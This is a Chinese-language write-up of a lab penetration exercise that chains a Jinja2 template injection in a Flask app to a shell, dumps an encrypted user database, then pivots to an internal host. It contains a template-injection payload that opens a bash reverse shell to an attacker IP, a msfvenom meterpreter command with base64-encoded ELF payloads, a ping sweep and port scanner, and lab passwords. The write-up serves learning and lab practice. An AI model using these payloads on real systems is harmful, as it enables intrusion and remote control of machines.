# 靶场拓扑&情况

# 渗透过程

nmap网络扫描

![](attachments/Pasted%20image%2020230305154310.png)

进入首页康康，有一个蹩脚的login，尝试sql注入，但是没有效果

![](attachments/Pasted%20image%2020230305155954.png)

在url中的值被读取到了页面上

![](attachments/Pasted%20image%2020230305160729.png)

确认是ssti，jinja2，虽然现在我们可以通过`{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}`来实现命令执行，但是想要提权还是要获取到shell才行

![](attachments/Pasted%20image%2020230305164715.png)

发现popen类

![](attachments/Pasted%20image%2020230305163716.png)

这里感觉是一个平时CTF中没有遇到过的玩法拿shell[python中的subprocess.Popen() 执行shell命令 - 技术改变命运Andy - 博客园 (cnblogs.com)](https://www.cnblogs.com/andy0816/p/15624304.html)
`{{''.__class__.__mro__[1].__subclasses__()[373]("bash -c 'bash -i >& /dev/tcp/192.168.163.129/23456 0>&1'",shell=True,stdout=None).communicate()}}`

![](attachments/Pasted%20image%2020230305171206.png)

拿一个源码

```python
from flask import Flask, render_template
import flask, flask_login
from urllib.parse import unquote
from pysqlcipher3 import dbapi2 as sqlcipher


app = Flask(__name__)
app.secret_key = 'RmxhZzF7IEltcG9ydGFudCBmaW5kaW5ncyB9'

pra = "pragma key='SecretssecretsSecrets...'"

try:
  with app.open_resource('static/file/f') as f:
    contents = f.read().decode("utf-8")
except:
    contents = ""    



def check(username):
    con = sqlcipher.connect("static/db2.db")
    con.execute(pra)
    userexists = False
    with con:
                cur = con.cursor()
                cur.execute("SELECT * FROM Users")
                rows = cur.fetchall()
                for row in rows:
                    uname = row[0]
                    if uname==username:
                        userexists=True
    return userexists

def validate(username, password):
    con = sqlcipher.connect("static/db2.db")
    con.execute(pra)
    completion = False
    with con:
                cur = con.cursor()
                cur.execute("SELECT * FROM Users")
                rows = cur.fetchall()
                for row in rows:
                    uname = row[0]
                    pw = row[1]
                    if uname==username:
                        completion=check_password(password, pw)
    return completion

def check_password(hashed_password, user_password):
   
    return hashed_password == user_password
    

login_manager = flask_login.LoginManager()

login_manager.init_app(app)

class User(flask_login.UserMixin):
    pass


@login_manager.user_loader
def user_loader(email):
    
    if check(email) ==False:


        return

    user = User()
    user.id = email
    return user


@login_manager.request_loader
def request_loader(request):
    email = flask.request.form.get('email')
    if not check(email):
   
        return

    user = User()
    user.id = email


    return user



@app.route('/index.html')
@app.route('/')
def index():
     return render_template('index.html')

   
@app.route('/login', methods=['GET', 'POST'])
def login():
    print("Login")
    if flask.request.method == 'POST':
      
        username = flask.request.form['email']
        password = flask.request.form['password']
        completion = validate(username, password)
        if completion == False:
            return render_template('unauth.html')
        else:
             user = User()
             user.id = username
             flask_login.login_user(user)

             return flask.redirect(flask.url_for('protected'))

    
    return render_template('bad.html')
   



@app.route('/protected')
@flask_login.login_required
def protected():
  
    return render_template('protected.html', luser = flask_login.current_user.id, contents=contents )

@app.route('/logout')
def logout():
    flask_login.logout_user()
    return render_template('logout.html')

@login_manager.unauthorized_handler
def unauthorized_handler():
    return render_template('unauth.html')

@app.errorhandler(404)
def not_found(e):
     message = unquote(flask.request.url)
     message =  flask.render_template_string(message)
     return render_template('404.html', dir=dir,
        help=help,
        locals=locals, message=message), 404

@app.errorhandler(500)
def internal_error(error):

    return flask.redirect(flask.url_for('login'))




if __name__ == '__main__':
    app.run()

```

secret_key其实是给flag需要base64解码
`Flag1{ Important findings }`

提权连sudo都没有，在这里卡住了，后面反应过来最开始的页面上有三个人，加上代码中的数据库，感觉是还需要做信息搜集

![](attachments/Pasted%20image%2020230305172148.png)

准备直接看数据库，发现源码中用了一个叫`sqlcipher`的工具，加上密钥才对数据库做的操作

```python
pra = "pragma key='SecretssecretsSecrets...'"

def validate(username, password):
    con = sqlcipher.connect("static/db2.db")
    con.execute(pra)
    completion = False
    with con:
                cur = con.cursor()
                cur.execute("SELECT * FROM Users")
                rows = cur.fetchall()
                for row in rows:
                    uname = row[0]
                    pw = row[1]
                    if uname==username:
                        completion=check_password(password, pw)
    return completion
```

![](attachments/Pasted%20image%2020230305173903.png)

命令比较奇怪，不过可以`.help`来看看，`pragma key='SecretssecretsSecrets...';`将key输入
`.tables`发现只有一个`users`表

![](attachments/Pasted%20image%2020230305174323.png)

```txt
hugh-janus|S0secretPassW0rd
anita-hanjaab|ssdf%dg5xc
clee-torres|asRtesa#2s
RmxhZzN7IEhleSwgcmVhZGluZyBzZWNyZXRzICB9|

```

最后一个是flag`Flag3{ Hey, reading secrets  }`
我flag2呢？？？先上号看看
上号后发现flag，黑黑的很难找
`Flag2{ Is this the foothold I have been looking for?}`
```txt
hugh-janus     ->  60571
anita-hanjaab  ->  60571
clee-torres    ->  60571
```

感觉可能是在暗示端口，想要试试扫描端口，但是发现www-data没有下载东西的权限，感觉还是有内网的，没办法下东西就很难受了，啥工具都没有，自己搞脚本扫内网还需要知道自身ip地址才能扫，最后看到IP是用`hostname -I`

![](attachments/Pasted%20image%2020230305181401.png)

这里看看wp，学到了新操作

```shell
for i in {1..254}; do (ping -c 1 192.168.100.$i | grep "bytes from"&); done
```
![](attachments/Pasted%20image%2020230305181852.png)

用`echo`来制作一个python脚本扫描端口
```shell
echo 'import socket' > scan.py
echo 'for port in range(1, 65535):' >> scan.py
echo '    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)' >> scan.py
echo '    sock.settimeout(1)' >> scan.py
echo '    result = sock.connect_ex(("192.168.100.1", port))' >> scan.py
echo '    if 0 == result:' >> scan.py
echo '        print(port)' >> scan.py
echo '    sock.close()' >> scan.py
```

>需要注意的是在当前目录我们是没有权限写东西的，转到tmp去写

![](attachments/Pasted%20image%2020230305182409.png)

![](attachments/Pasted%20image%2020230305182441.png)

这里用到ssh远程端口转发`ssh -R 44443:192.168.100.1:443 root@192.168.163.129`,emmm,出现了一些问题找机会问问大佬

![](attachments/Pasted%20image%2020230305195138.png)

ssh远程转发失效那就考虑msf来做portfwd，和TF1一样先生成一个shell
`msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.163.129 LPORT=8888 -f elf -o TF3shell.elf`
然后转为base64

![](attachments/Pasted%20image%2020230305200231.png)

```shell
f0VMRgEBAQAAAAAAAAAAAAIAAwABAAAAVIAECDQAAAAAAAAAAAAAADQAIAABAAAAAAAAAAEAAAAAAAAAAIAECACABAjPAAAASgEAAAcAAAAAEAAAagpeMdv341NDU2oCsGaJ4c2Al1towKijgWgCACK4ieFqZlhQUVeJ4UPNgIXAeRlOdD1oogAAAFhqAGoFieMxyc2AhcB5vesnsge5ABAAAInjwesMweMMsH3NgIXAeBBbieGZsmqwA82AhcB4Av/huAEAAAC7AQAAAM2Af
f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAAeABAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAEAAOAABAAAAAAAAAAEAAAAHAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAA+gAAAAAAAAB8AQAAAAAAAAAQAAAAAAAAMf9qCViZthBIidZNMclqIkFaagdaDwVIhcB4UWoKQVlQailYmWoCX2oBXg8FSIXAeDtIl0i5AgAiuMCoo4FRSInmahBaaipYDwVZSIXAeSVJ/8l0GFdqI1hqAGoFSInnSDH2DwVZWV9IhcB5x2o8WGoBXw8FXmp+Wg8FSIXAeO3/5g==

```

![](attachments/Pasted%20image%2020230305202156.png)

设置portfwd

![](attachments/Pasted%20image%2020230305202540.png)

发现80端口的服务和之前的是一样的

![](attachments/Pasted%20image%2020230305202730.png)

访问的时候意识到端口不存在99443，调成了9443，一个全新的网站

![](attachments/Pasted%20image%2020230305202910.png)

下面这个upload
![](attachments/Pasted%20image%2020230305203159.png)

这里登录admin考虑在文章中有提到自己的名字，使用之前的数据库中的密码`hugh-janus:S0secretPassW0rd`

![](attachments/Pasted%20image%2020230305204319.png)

登录失败，换成admin，登录成功

![](attachments/Pasted%20image%2020230305231014.png)

很奇怪每次到这里就会卡住，无法接着做操作，网页就访问不上了
从官网下载hellowworld的包，进行修改

![](attachments/Pasted%20image%2020230306001937.png)


# 参考链接
[python中的subprocess.Popen() 执行shell命令 - 技术改变命运Andy - 博客园 (cnblogs.com)](https://www.cnblogs.com/andy0816/p/15624304.html)

